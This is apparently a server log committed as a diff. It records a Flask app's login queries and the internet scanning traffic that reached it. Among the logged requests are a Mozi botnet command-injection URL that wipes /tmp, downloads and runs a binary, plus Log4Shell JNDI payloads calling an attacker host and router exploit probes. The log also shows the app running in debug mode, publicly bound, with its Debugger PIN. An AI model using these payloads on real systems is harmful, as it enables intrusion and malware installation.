+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:39:27,130 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:39:27,136 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:39:27] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:40:50] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:40:50,556 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:40:50,556 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:40:50,556 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:40:50,562 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:40:50] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:44:34] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:44:34,785 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:44:34,786 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:44:34,786 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:44:34,792 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:44:34] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:45:54] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:45:54,303 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:45:54,304 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:45:54,304 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:45:54,310 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:45:54] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:47:08] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:47:09,043 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:47:09,043 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:47:09,043 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:47:09,049 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:47:09] "[37mPOST /login HTTP/1.1[0m" 200 -
+46.174.191.32 - - [11/Dec/2021 12:47:56] "[33mGET / HTTP/1.0[0m" 404 -
+45.137.23.232 - - [11/Dec/2021 13:57:39] "[33mGET / HTTP/1.1[0m" 404 -
+120.224.66.44 - - [11/Dec/2021 15:50:07] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 15:50:07,221 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 15:50:07,222 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 15:50:07,222 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 15:50:07,228 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 15:50:07] "[37mPOST /login HTTP/1.1[0m" 200 -
+ * Detected change in '/root/graph_flask/apps/models.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+ * Detected change in '/root/graph_flask/apps/models.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+121.250.0.89 - - [11/Dec/2021 16:14:18] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 16:14:18,878 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'sql_mode'
+2021-12-11 16:14:18,878 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,885 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'lower_case_table_names'
+2021-12-11 16:14:18,886 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,897 INFO sqlalchemy.engine.base.Engine SELECT DATABASE()
+2021-12-11 16:14:18,897 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,907 INFO sqlalchemy.engine.base.Engine show collation where `Charset` = 'utf8mb4' and `Collation` = 'utf8mb4_bin'
+2021-12-11 16:14:18,907 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,913 INFO sqlalchemy.engine.base.Engine SELECT CAST('test plain returns' AS CHAR(60)) AS anon_1
+2021-12-11 16:14:18,913 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,918 INFO sqlalchemy.engine.base.Engine SELECT CAST('test unicode returns' AS CHAR(60)) AS anon_1
+2021-12-11 16:14:18,919 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,924 INFO sqlalchemy.engine.base.Engine SELECT CAST('test collated returns' AS CHAR CHARACTER SET utf8mb4) COLLATE utf8mb4_bin AS anon_1
+2021-12-11 16:14:18,924 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 16:14:18,934 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 16:14:18,935 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 16:14:18,935 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 16:14:18,941 INFO sqlalchemy.engine.base.Engine ROLLBACK
+121.250.0.89 - - [11/Dec/2021 16:14:18] "[37mPOST /login HTTP/1.1[0m" 200 -
+223.104.196.57 - - [11/Dec/2021 16:14:49] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 16:14:50,057 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 16:14:50,058 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 16:14:50,058 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 16:14:50,064 INFO sqlalchemy.engine.base.Engine ROLLBACK
+223.104.196.57 - - [11/Dec/2021 16:14:50] "[37mPOST /login HTTP/1.1[0m" 200 -
+223.104.196.57 - - [11/Dec/2021 16:29:49] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 16:29:49,140 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 16:29:49,141 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 16:29:49,141 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 16:29:49,147 INFO sqlalchemy.engine.base.Engine ROLLBACK
+223.104.196.57 - - [11/Dec/2021 16:29:49] "[37mPOST /login HTTP/1.1[0m" 200 -
+45.155.205.127 - - [11/Dec/2021 16:33:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.155.205.127 - - [11/Dec/2021 16:33:21] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+120.224.66.44 - - [11/Dec/2021 16:45:03] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 16:45:03,440 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 16:45:03,441 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 16:45:03,441 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 16:45:03,447 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 16:45:03] "[37mPOST /login HTTP/1.1[0m" 200 -
+223.104.196.57 - - [11/Dec/2021 18:19:11] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 18:19:11,849 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 18:19:11,850 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 18:19:11,850 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 18:19:11,856 INFO sqlalchemy.engine.base.Engine ROLLBACK
+223.104.196.57 - - [11/Dec/2021 18:19:11] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 18:19:14,414 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 18:19:14,415 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 18:19:14,415 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 18:19:14,421 INFO sqlalchemy.engine.base.Engine ROLLBACK
+223.104.196.57 - - [11/Dec/2021 18:19:14] "[37mPOST /login HTTP/1.1[0m" 200 -
+165.227.136.172 - - [11/Dec/2021 18:37:05] "[33mGET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0[0m" 404 -
+165.227.136.172 - - [11/Dec/2021 18:37:15] code 400, message Bad request syntax ('\x04\x01\x00\x16\x7f\x00\x00\x01root\x00')
+165.227.136.172 - - [11/Dec/2021 18:37:15] "[35m[1m   root [0m" HTTPStatus.BAD_REQUEST -
+165.227.136.172 - - [11/Dec/2021 18:37:15] code 400, message Bad request syntax ('\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03')
+165.227.136.172 - - [11/Dec/2021 18:37:15] "[35m[1m  [0m" HTTPStatus.BAD_REQUEST -
+165.227.136.172 - - [11/Dec/2021 18:37:15] "[33mOPTIONS / HTTP/1.0[0m" 404 -
+165.227.136.172 - - [11/Dec/2021 18:37:15] "[33mHEAD / HTTP/1.0[0m" 404 -
+165.227.136.172 - - [11/Dec/2021 18:37:15] code 400, message Bad request version ('RTSP/1.0')
+165.227.136.172 - - [11/Dec/2021 18:37:15] "[35m[1mOPTIONS / RTSP/1.0[0m" HTTPStatus.BAD_REQUEST -
+182.88.78.153 - - [11/Dec/2021 18:37:18] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
+182.88.78.153 - - [11/Dec/2021 18:37:18] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+165.227.136.172 - - [11/Dec/2021 18:37:18] "[33mGET / HTTP/1.1[0m" 404 -
+161.189.134.11 - - [11/Dec/2021 18:43:39] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
+161.189.134.11 - - [11/Dec/2021 18:43:39] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
+161.189.192.94 - - [11/Dec/2021 18:47:20] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
+161.189.192.94 - - [11/Dec/2021 18:47:20] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
+161.189.192.94 - - [11/Dec/2021 18:57:59] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
+161.189.192.94 - - [11/Dec/2021 18:57:59] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
+128.1.248.26 - - [11/Dec/2021 19:00:25] "[33mGET / HTTP/1.1[0m" 404 -
+185.180.143.8 - - [11/Dec/2021 19:01:18] "[33mGET / HTTP/1.1[0m" 404 -
+161.189.134.11 - - [11/Dec/2021 19:02:16] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
+161.189.134.11 - - [11/Dec/2021 19:02:16] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
+159.196.34.159 - - [11/Dec/2021 19:12:51] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+49.89.13.62 - - [11/Dec/2021 19:22:43] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/0.9[0m" 404 -
+27.198.42.54 - - [11/Dec/2021 19:47:25] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 19:47:25,753 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 19:47:25,754 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 19:47:25,754 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 19:47:25,760 INFO sqlalchemy.engine.base.Engine ROLLBACK
+27.198.42.54 - - [11/Dec/2021 19:47:25] "[37mPOST /login HTTP/1.1[0m" 200 -
+31.220.3.140 - - [11/Dec/2021 20:07:34] "[33mGET / HTTP/1.1[0m" 404 -
+192.241.214.48 - - [11/Dec/2021 20:09:46] "[33mGET / HTTP/1.1[0m" 404 -
+187.131.22.107 - - [11/Dec/2021 20:24:05] "[33mGET / HTTP/1.1[0m" 404 -
+117.154.65.116 - - [11/Dec/2021 20:48:36] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+209.141.53.75 - - [11/Dec/2021 20:55:58] "[33mGET /script HTTP/1.1[0m" 404 -
+109.237.103.118 - - [11/Dec/2021 21:38:07] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01D\x01\x00\x01@\x03\x03\x8b\x95P!;\x07á)x¾%\x8aI\x14õ\x01¾2Xâ\x9a)G1ØË¬\x02<±\x0f5')
+109.237.103.118 - - [11/Dec/2021 21:38:07] "[35m[1mD @P!;á)x¾%Iõ¾2Xâ)G1ØË¬<±5 /ÿ+5eØü$Ö·N×>ÑuBÎ©$ø+pG bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+109.237.103.118 - - [11/Dec/2021 21:38:07] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+101.35.239.173 - - [11/Dec/2021 21:51:18] "[33mGET /phpmyadmin/index.php HTTP/1.1[0m" 404 -
+101.35.239.173 - - [11/Dec/2021 21:51:18] "[33mGET /phpmyadmin4.8.5/index.php HTTP/1.1[0m" 404 -
+101.35.239.173 - - [11/Dec/2021 21:51:18] "[33mGET /pmd/index.php HTTP/1.1[0m" 404 -
+101.35.239.173 - - [11/Dec/2021 21:51:20] "[33mGET /index.php HTTP/1.1[0m" 404 -
+209.141.50.223 - - [11/Dec/2021 22:03:52] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+185.216.140.6 - - [11/Dec/2021 22:13:38] code 400, message Bad request version ('À\x14À')
+185.216.140.6 - - [11/Dec/2021 22:13:38] "[35m[1m   K4Å?oíÌ¼Qt»8:ÓèêPm':¹á4}  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+185.216.140.6 - - [11/Dec/2021 22:14:18] "[33mGET / HTTP/1.1[0m" 404 -
+27.198.42.54 - - [11/Dec/2021 22:15:15] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 22:15:15,396 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 22:15:15,396 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 22:15:15,396 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 22:15:15,403 INFO sqlalchemy.engine.base.Engine ROLLBACK
+27.198.42.54 - - [11/Dec/2021 22:15:15] "[37mPOST /login HTTP/1.1[0m" 200 -
+5.202.218.111 - - [11/Dec/2021 22:38:14] "[33mGET / HTTP/1.1[0m" 404 -
+220.198.209.104 - - [12/Dec/2021 00:11:15] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/0.9[0m" 404 -
+138.118.235.129 - - [12/Dec/2021 00:16:10] "[33mGET / HTTP/1.1[0m" 404 -
+94.102.51.31 - - [12/Dec/2021 00:18:04] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+94.102.51.31 - - [12/Dec/2021 00:18:04] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+116.74.17.7 - - [12/Dec/2021 00:18:43] "[33mGET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0[0m" 404 -
+114.255.88.84 - - [12/Dec/2021 02:03:01] "[33mGET / HTTP/1.0[0m" 404 -
+45.9.20.176 - - [12/Dec/2021 02:50:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.9.20.176 - - [12/Dec/2021 02:50:20] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+85.240.37.68 - - [12/Dec/2021 03:05:18] "[33mGET / HTTP/1.1[0m" 404 -
+5.188.210.227 - - [12/Dec/2021 03:19:38] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [12/Dec/2021 03:19:38] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:19:43] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [12/Dec/2021 03:19:43] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:19:50] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [12/Dec/2021 03:19:50] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:21:26] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [12/Dec/2021 03:21:26] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:21:32] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [12/Dec/2021 03:21:32] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:21:37] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [12/Dec/2021 03:21:37] "[35m[1m P¼Òã [0m" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [12/Dec/2021 03:22:20] "[33mGET http://5.188.210.227/echo.php HTTP/1.1[0m" 404 -
+192.241.214.201 - - [12/Dec/2021 04:50:55] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+180.149.125.171 - - [12/Dec/2021 04:58:59] "[33mGET /c/ HTTP/1.1[0m" 404 -
+91.108.45.149 - - [12/Dec/2021 08:00:58] "[33mGET / HTTP/1.1[0m" 404 -
+89.248.165.93 - - [12/Dec/2021 08:47:42] "[33mGET / HTTP/1.0[0m" 404 -
+ * Detected change in '/root/graph_flask/ext/bcrypt.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+ * Serving Flask app "apps" (lazy loading)
+ * Environment: development
+ * Debug mode: on
+ * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+120.224.66.44 - - [12/Dec/2021 11:04:19] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-12 11:04:19,525 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'sql_mode'
+2021-12-12 11:04:19,526 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,533 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'lower_case_table_names'
+2021-12-12 11:04:19,533 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,544 INFO sqlalchemy.engine.base.Engine SELECT DATABASE()
+2021-12-12 11:04:19,544 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,554 INFO sqlalchemy.engine.base.Engine show collation where `Charset` = 'utf8mb4' and `Collation` = 'utf8mb4_bin'
+2021-12-12 11:04:19,554 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,560 INFO sqlalchemy.engine.base.Engine SELECT CAST('test plain returns' AS CHAR(60)) AS anon_1
+2021-12-12 11:04:19,560 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,566 INFO sqlalchemy.engine.base.Engine SELECT CAST('test unicode returns' AS CHAR(60)) AS anon_1
+2021-12-12 11:04:19,566 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,571 INFO sqlalchemy.engine.base.Engine SELECT CAST('test collated returns' AS CHAR CHARACTER SET utf8mb4) COLLATE utf8mb4_bin AS anon_1
+2021-12-12 11:04:19,571 INFO sqlalchemy.engine.base.Engine {}
+2021-12-12 11:04:19,581 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-12 11:04:19,582 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-12 11:04:19,582 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-12 11:04:19,588 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [12/Dec/2021 11:04:19] "[37mPOST /login HTTP/1.1[0m" 200 -
+180.149.125.168 - - [12/Dec/2021 12:37:26] "[33mGET / HTTP/1.1[0m" 404 -
+14.102.19.146 - - [12/Dec/2021 12:48:57] "[33mGET / HTTP/1.1[0m" 404 -
+159.223.6.7 - - [12/Dec/2021 14:09:56] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03ni¬¯\x8b,Ú\x80D\x13')
+159.223.6.7 - - [12/Dec/2021 14:09:56] "[35m[1mû ÷ni¬¯,ÚD Qo¤1ìBÝMHÜó <ÌÌÌÀ0À,À(À$ÀÀ[0m" HTTPStatus.BAD_REQUEST -
+45.9.20.94 - - [12/Dec/2021 15:08:03] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.9.20.94 - - [12/Dec/2021 15:08:03] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+45.137.23.232 - - [12/Dec/2021 15:21:51] "[33mGET / HTTP/1.1[0m" 404 -
+118.126.124.74 - - [12/Dec/2021 15:43:01] "[33mGET / HTTP/1.1[0m" 404 -
+46.174.191.29 - - [12/Dec/2021 16:05:21] "[33mGET / HTTP/1.0[0m" 404 -
+121.4.56.143 - - [12/Dec/2021 18:00:36] "[33mGET / HTTP/1.1[0m" 404 -
+121.4.56.143 - - [12/Dec/2021 18:00:43] "[33mGET / HTTP/1.1[0m" 404 -
+121.4.56.143 - - [12/Dec/2021 18:00:43] "[33mGET / HTTP/1.1[0m" 404 -
+121.4.56.143 - - [12/Dec/2021 18:00:43] "[33mGET / HTTP/1.1[0m" 404 -
+27.198.42.54 - - [12/Dec/2021 18:31:33] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-12 18:31:33,675 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-12 18:31:33,676 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-12 18:31:33,676 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-12 18:31:33,682 INFO sqlalchemy.engine.base.Engine ROLLBACK
+27.198.42.54 - - [12/Dec/2021 18:31:33] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.195.30.152 - - [12/Dec/2021 18:48:12] "[33mGET / HTTP/1.1[0m" 404 -
+120.195.30.152 - - [12/Dec/2021 18:48:12] "[33mGET / HTTP/1.1[0m" 404 -
+120.195.30.152 - - [12/Dec/2021 18:48:15] "[33mGET / HTTP/1.1[0m" 404 -
+120.195.30.152 - - [12/Dec/2021 18:48:15] "[33mGET / HTTP/1.1[0m" 404 -
+186.33.73.131 - - [12/Dec/2021 19:43:20] "[33mGET / HTTP/1.1[0m" 404 -
+45.9.20.176 - - [12/Dec/2021 19:44:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.9.20.176 - - [12/Dec/2021 19:44:39] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+139.180.157.168 - - [12/Dec/2021 20:00:05] "[33mGET / HTTP/1.1[0m" 404 -
+118.126.124.172 - - [12/Dec/2021 20:07:52] "[33mGET /c/ HTTP/1.1[0m" 404 -
+209.141.50.223 - - [12/Dec/2021 20:37:39] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+65.49.20.66 - - [12/Dec/2021 21:43:07] "[33mGET / HTTP/1.1[0m" 404 -
+165.227.136.172 - - [12/Dec/2021 22:11:45] "[33mGET / HTTP/1.1[0m" 404 -
+165.227.136.172 - - [12/Dec/2021 22:11:46] "[33mHEAD / HTTP/1.0[0m" 404 -
+165.227.136.172 - - [12/Dec/2021 22:12:05] code 400, message Bad request syntax ('\x04\x01\x00\x16\x7f\x00\x00\x01root\x00')
+165.227.136.172 - - [12/Dec/2021 22:12:05] "[35m[1m   root [0m" HTTPStatus.BAD_REQUEST -
+165.227.136.172 - - [12/Dec/2021 22:12:05] code 400, message Bad request syntax ('\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03')
+165.227.136.172 - - [12/Dec/2021 22:12:05] "[35m[1m  [0m" HTTPStatus.BAD_REQUEST -
+165.227.136.172 - - [12/Dec/2021 22:12:05] "[33mOPTIONS / HTTP/1.0[0m" 404 -
+120.240.48.82 - - [12/Dec/2021 22:47:31] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0[0m" 404 -
+94.102.51.31 - - [12/Dec/2021 22:48:04] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+94.102.51.31 - - [12/Dec/2021 22:48:04] "[35m[1m  à          [0m" HTTPStatus.BAD_REQUEST -
+105.213.169.19 - - [12/Dec/2021 23:39:12] "[33mGET / HTTP/1.1[0m" 404 -
+221.228.87.37 - - [12/Dec/2021 23:39:40] "[33mGET / HTTP/1.1[0m" 404 -
+221.228.87.37 - - [12/Dec/2021 23:39:40] "[33mGET / HTTP/1.1[0m" 404 -
+221.228.87.37 - - [12/Dec/2021 23:39:40] "[33mGET / HTTP/1.1[0m" 404 -
+221.228.87.37 - - [12/Dec/2021 23:39:40] "[33mGET / HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:41] "[33mPOST /api/v1/?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:42] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:46] "[33mPOST /api?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:46] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:48] "[33mPOST /api/v1?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:49] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:52] "[33mPOST /api/login?username=$%7Bjndi:ldap://78.31.71.248:1389/ls72gn%7D HTTP/1.1[0m" 404 -
+78.31.71.248 - - [13/Dec/2021 00:32:52] "[33mPOST /?search=$%7Bjndi:ldap://78.31.71.248:1389/shztit%7D HTTP/1.1[0m" 404 -
